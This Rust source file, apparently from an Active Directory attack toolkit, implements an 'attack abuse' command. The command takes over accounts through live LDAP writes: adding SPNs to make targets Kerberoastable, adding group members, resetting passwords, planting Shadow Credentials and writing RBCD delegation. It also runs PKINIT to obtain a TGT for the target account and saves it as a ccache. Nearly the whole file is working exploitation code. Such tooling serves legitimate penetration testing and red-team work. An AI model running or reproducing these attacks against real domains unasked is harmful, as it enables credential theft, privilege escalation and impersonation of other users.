//! Active LDAP-write abuse (add SPN / group member / password reset /
//! KeyCredential / RBCD) plus PKINIT — the exploitation counterparts to
//! the ACL findings the graph reports.

use adhammer_collector::{Collector, LdapConfig};
use anyhow::{Context, Result};
use clap::Parser;

/// LDAP-write / KDC abuse action for `attack abuse`.
///
/// Replaced a bare `--action <string>` in 1.3.10 — clap now rejects unknown
/// actions at parse time instead of running an LDAP bind first only to fail
/// with "unknown action 'foo'" later.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum AbuseAction {
    /// Add a servicePrincipalName to the target → makes it Kerberoastable.
    AddSpn,
    /// Add the given user to the target group.
    AddMember,
    /// Reset the target account's password (requires LDAPS or --gssapi sealing).
    SetPassword,
    /// Shadow Credentials: add a KeyCredential to msDS-KeyCredentialLink.
    AddKeycred,
    /// Write RBCD: allow --value to impersonate to the target (msDS-AllowedToActOnBehalfOfOtherIdentity).
    WriteRbcd,
    /// PKINIT with a previously issued Shadow Credentials key → TGT as the target account.
    Pkinit,
}

#[derive(Parser)]
pub(crate) struct AbuseArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::OptAuth,
    /// Which abuse to perform.
    #[arg(long)]
    pub action: AbuseAction,
    /// Target sAMAccountName (the object to modify; the group for add-member; the account
    /// to authenticate as for `pkinit`)
    #[arg(long)]
    pub target: String,
    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
    /// the key .pem path — defaults to `<target>.key.pem`
    #[arg(long, default_value = "")]
    pub value: String,
    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
    #[arg(long)]
    pub realm: Option<String>,
    /// KDC `host[:port]` (pkinit)
    #[arg(long)]
    pub kdc: Option<String>,
    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
    #[arg(long)]
    pub ldap389: bool,
    /// DC host for --ldap389
    #[arg(long)]
    pub host: Option<String>,
}

/// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
pub(crate) async fn abuse(mut a: AbuseArgs) -> Result<()> {
    // AbuseArgs.auth.password is Option<String>; resolve through the same @file: / env /
    // TTY-prompt cascade as every other subcommand. `resolve_secret` returns "" when
    // nothing is available; downstream code turns that into a "needs --password" error
    // for the actions that require one (pkinit branches on the key .pem instead).
    {
        let cur = a.auth.password.as_deref().unwrap_or("");
        let resolved = crate::resolve_secret(cur, "ADHAMMER_PASSWORD")?;
        if !resolved.is_empty() {
            a.auth.password = Some(resolved);
        }
    }
    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
    if a.action == AbuseAction::Pkinit {
        let realm = a.realm.clone().context("pkinit needs --realm")?;
        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
        let key_path = if a.value.is_empty() {
            format!("{}.key.pem", a.target)
        } else {
            a.value.clone()
        };
        let pem =
            std::fs::read_to_string(&key_path).with_context(|| format!("read key {key_path}"))?;
        let tgt =
            adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
        let cc_path = format!("{}.ccache", a.target);
        std::fs::write(&cc_path, &tgt.ccache)?;
        println!(
            "[+] PKINIT succeeded — TGT for {}@{} (via {})",
            a.target, realm, tgt.sname
        );
        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
        println!("    ticket valid until {}", tgt.end_time);
        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
        return Ok(());
    }

    // add-keycred over raw LDAP-389 + NTLM SASL (no LDAPS) — also the relay code path.
    if a.ldap389 {
        let host = a.host.clone().context("--ldap389 needs --host")?;
        let realm = a.realm.clone().context("--ldap389 needs --realm")?;
        let user = a.auth.user.clone().context("--ldap389 needs --user")?;
        let password = a
            .auth
            .password
            .clone()
            .context("--ldap389 needs --password")?;
        let bare = user
            .split('@')
            .next()
            .unwrap_or(&user)
            .rsplit('\\')
            .next()
            .unwrap_or(&user)
            .to_string();
        let base: String = realm
            .split('.')
            .map(|p| format!("DC={p}"))
            .collect::<Vec<_>>()
            .join(",");
        let mut ld = adhammer_ldap::LdapClient::connect(&format!("{host}:389")).await?;
        ld.bind_ntlm(&realm, &bare, &password, "ADHAMMER").await?;
        let dn = ld.find_dn(&base, &a.target).await?;
        let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
        ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
            .await?;
        std::fs::write(format!("{}.key.pem", a.target), &kc.private_key_pem)?;
        println!("[+] LDAP-389 (NTLM SASL) add-keycred on {dn}");
        println!(
            "    key saved to {}.key.pem — Phase 2: attack abuse --action pkinit --target {}",
            a.target, a.target
        );
        return Ok(());
    }

    let cfg = LdapConfig {
        url: a.auth.url.clone().context("this action needs --url")?,
        bind_dn: a.auth.user.clone().context("this action needs --user")?,
        password: a
            .auth
            .password
            .clone()
            .context("this action needs --password")?,
        base_dn: None,
        insecure: a.auth.insecure,
        gssapi: false,
    };
    let mut c = Collector::connect(&cfg).await?;
    // ux-2: accept SID / sAMAccountName / DN — classify() dispatches to the right resolver.
    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;

    match a.action {
        AbuseAction::AddSpn => {
            c.add_value(&target_dn, "servicePrincipalName", &a.value)
                .await?;
            println!(
                "[+] added SPN '{}' to {} — now Kerberoastable",
                a.value, a.target
            );
        }
        AbuseAction::AddMember => {
            let member_dn = crate::target::to_dn(&mut c, &a.value).await?;
            c.add_value(&target_dn, "member", &member_dn).await?;
            println!("[+] added {} to group {}", a.value, a.target);
        }
        AbuseAction::SetPassword => {
            // AD refuses `unicodePwd` writes on an unencrypted channel — save the user a
            // WILL_NOT_PERFORM roundtrip by front-checking the URL and telling them why.
            let url = a.auth.url.as_deref().unwrap_or("");
            if url.starts_with("ldap://") {
                anyhow::bail!(
                    "set-password requires an encrypted LDAP channel — use `ldaps://` \
                     (add --insecure for self-signed) or --gssapi with SASL sealing. \
                     Plain ldap:// will always fail with WILL_NOT_PERFORM (0x5003)."
                );
            }
            c.set_password(&target_dn, &a.value).await?;
            println!("[+] reset password of {}", a.target);
        }
        AbuseAction::AddKeycred => {
            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary)
                .await?;
            let key_path = format!("{}.key.pem", a.target);
            std::fs::write(&key_path, &kc.private_key_pem)?;
            println!(
                "[+] added Shadow Credential to {} — key saved to {key_path}",
                a.target
            );
            println!(
                "    (Phase 2: PKINIT with this key to obtain a TGT as {})",
                a.target
            );
        }
        AbuseAction::WriteRbcd => {
            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
            let trustee = crate::target::to_sid(&mut c, &a.value).await?;
            let sd = windows_sddl::build_rbcd_sd(&trustee);
            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd)
                .await?;
            println!(
                "[+] wrote RBCD on {} allowing {} to impersonate to it",
                a.target, a.value
            );
        }
        AbuseAction::Pkinit => unreachable!("pkinit handled above the LDAP-connect block"),
    }
    Ok(())
}
